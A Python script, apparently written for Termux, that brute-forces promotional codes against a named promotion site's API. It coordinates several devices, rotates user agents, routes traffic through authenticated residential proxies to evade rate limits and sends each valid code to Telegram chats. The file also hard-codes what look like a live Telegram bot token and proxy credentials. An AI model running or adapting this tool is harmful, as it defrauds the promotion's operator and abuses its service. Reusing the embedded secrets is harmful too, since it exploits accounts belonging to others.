import asyncio
import aiohttp
import aiofiles
import random
import time
from collections import Counter
import logging
import os
from datetime import datetime
import json
import hashlib

# Konfigurasi warna ANSI
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"

# Konfigurasi logging
logging.basicConfig(
    filename=f'validation_{datetime.now().strftime("%Y%m%d_%H%M")}.log',
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Konfigurasi Telegram dan User Agents (tidak berubah)
TELEGRAM_BOT_TOKEN = '7620704354:AAFa19rWmJ3pQKEExzK4hJGxSi26BTz-t1E'
CHAT_IDS = ['6426778764', '6180131575']

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A5341f Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

# Konfigurasi proxy (tidak berubah)
PROXIES = [
    {
        'proxy_host': 'gw.dataimpulse.com',
        'proxy_port': '823',
        'proxy_username': 'd84172e9eb36a964d3af__cr.id',
        'proxy_password': '1934704c7bbda20d'
    },
]

class DeviceCoordinator:
    def __init__(self):
        self.device_id = None
        self.total_devices = 0
        self.state_file = '/data/data/com.termux/files/home/.device_state.json'
        self.heartbeat_interval = 30
        self.device_timeout = 60

    def get_device_mac(self):
        """Get unique device identifier"""
        try:
            with open('/sys/class/net/wlan0/address', 'r') as f:
                return f.read().strip()
        except:
            if not os.path.exists('.device_id'):
                with open('.device_id', 'w') as f:
                    f.write(hashlib.md5(str(time.time()).encode()).hexdigest())
            with open('.device_id', 'r') as f:
                return f.read().strip()

    async def initialize(self):
        """Initialize device coordination"""
        device_mac = self.get_device_mac()
        os.makedirs(os.path.dirname(self.state_file), exist_ok=True)
        
        async with aiofiles.open(self.state_file, 'a+') as f:
            await f.seek(0)
            content = await f.read()
            try:
                state = json.loads(content) if content else {}
            except:
                state = {}

        # Update device state
        current_time = time.time()
        state[device_mac] = {
            'last_seen': current_time,
            'status': 'active'
        }

        # Clean up inactive devices
        active_devices = {
            mac: data for mac, data in state.items()
            if current_time - data['last_seen'] < self.device_timeout
        }

        async with aiofiles.open(self.state_file, 'w') as f:
            await f.write(json.dumps(active_devices))

        # Assign device ID
        sorted_macs = sorted(active_devices.keys())
        self.device_id = sorted_macs.index(device_mac) + 1
        self.total_devices = len(active_devices)

        # Start heartbeat
        asyncio.create_task(self.heartbeat())
        
        return self.device_id, self.total_devices

    async def heartbeat(self):
        """Maintain device presence"""
        while True:
            try:
                device_mac = self.get_device_mac()
                async with aiofiles.open(self.state_file, 'r') as f:
                    content = await f.read()
                    state = json.loads(content) if content else {}
                
                state[device_mac] = {
                    'last_seen': time.time(),
                    'status': 'active'
                }
                
                current_time = time.time()
                active_devices = {
                    mac: data for mac, data in state.items()
                    if current_time - data['last_seen'] < self.device_timeout
                }
                
                async with aiofiles.open(self.state_file, 'w') as f:
                    await f.write(json.dumps(active_devices))
                
                self.total_devices = len(active_devices)
                
            except Exception as e:
                logger.error(f"Heartbeat error: {e}")
            
            await asyncio.sleep(self.heartbeat_interval)

class CodeValidator:
    def __init__(self, device_id, total_devices):
        self.device_id = device_id
        self.total_devices = total_devices
        self.sem = asyncio.Semaphore(150)
        self.success_patterns = {}
        self.batch_size = 2000
        self.retry_delay = 0.1
        self.success_count = 0
        self.start_time = time.time()
        self.validated_codes = set()

    def generate_code(self):
        """Generate a random code for validation"""
        return f"CODE-{random.randint(1000, 9999)}"

    def should_process_code(self, code):
        """Determine if this device should process the code"""
        if self.total_devices == 0:
            return False
        code_hash = int(hashlib.md5(code.encode()).hexdigest(), 16)
        return (code_hash % self.total_devices) + 1 == self.device_id

    async def validate_code(self, session, code):
        if not self.should_process_code(code):
            return code, 0, "Skipped - not in device range"

        if code in self.validated_codes:
            return code, 400, "invalid"
        
        self.validated_codes.add(code)

        async with self.sem:
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Content-Type': 'application/json',
            }
            payload = {"uniq_code": code}

            for attempt in range(2):
                proxy_config = random.choice(PROXIES)
                proxy_url = f"http://{proxy_config['proxy_host']}:{proxy_config['proxy_port']}"
                proxy_auth = aiohttp.BasicAuth(
                    login=proxy_config['proxy_username'],
                    password=proxy_config['proxy_password']
                )

                try:
                    async with session.post(
                        'https://dashboard.yamalubepromo.com/api/v1/wziioquyqthkal',
                        json=payload,
                        headers=headers,
                        proxy=proxy_url,
                        proxy_auth=proxy_auth,
                        timeout=3
                    ) as response:
                        if response.status == 200:
                            await self.save_valid_code(code)
                            return code, 200, await response.text()
                        elif response.status == 400:
                            return code, 400, await response.text()
                        
                except Exception as e:
                    if attempt < 1:
                        await asyncio.sleep(self.retry_delay)
                    continue

            return code, 500, "Failed after retries"

    async def save_valid_code(self, code):
        try:
            async with aiofiles.open('valid_codes.txt', 'a') as f:
                await f.write(f"{code}\n")
            
            for chat_id in CHAT_IDS:
                message = f"✅ VALID CODE [Device {self.device_id}/{self.total_devices}]: {code}"
                url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                payload = {'chat_id': chat_id, 'text': message}
                async with aiohttp.ClientSession() as session:
                    await session.post(url, data=payload)
            
            self.success_count += 1
            rate = self.success_count / ((time.time() - self.start_time) / 60)
            logger.info(f"Device {self.device_id}: Success rate: {rate:.2f} codes/minute")
            
        except Exception as e:
            logger.error(f"Error saving valid code: {e}")

async def main():
    # Initialize device coordination
    coordinator = DeviceCoordinator()
    device_id, total_devices = await coordinator.initialize()
    
    print(f"{GREEN}Device {device_id}/{total_devices} initialized{RESET}")
    logger.info(f"Device {device_id}/{total_devices} started")
    
    # Initialize validator
    validator = CodeValidator(device_id, total_devices)
    
    # Start validation process
    async with aiohttp.ClientSession() as session:
        while True:
            codes = [validator.generate_code() for _ in range(validator.batch_size)]
            tasks = [validator.validate_code(session, code) for code in codes]
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            valid = sum(1 for r in results if isinstance(r, tuple) and r[1] == 200)
            total = len([r for r in results if isinstance(r, tuple)])
            
            print(f"\r{GREEN}Device {device_id}/{total_devices} - Valid: {valid} | Total: {total}{RESET}", end='')
            
            await asyncio.sleep(0.1)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Shutting down...{RESET}")
    except Exception as e:
        print(f"\n{RED}Error: {e}{RESET}")
        logger.error(f"Fatal error: {e}")
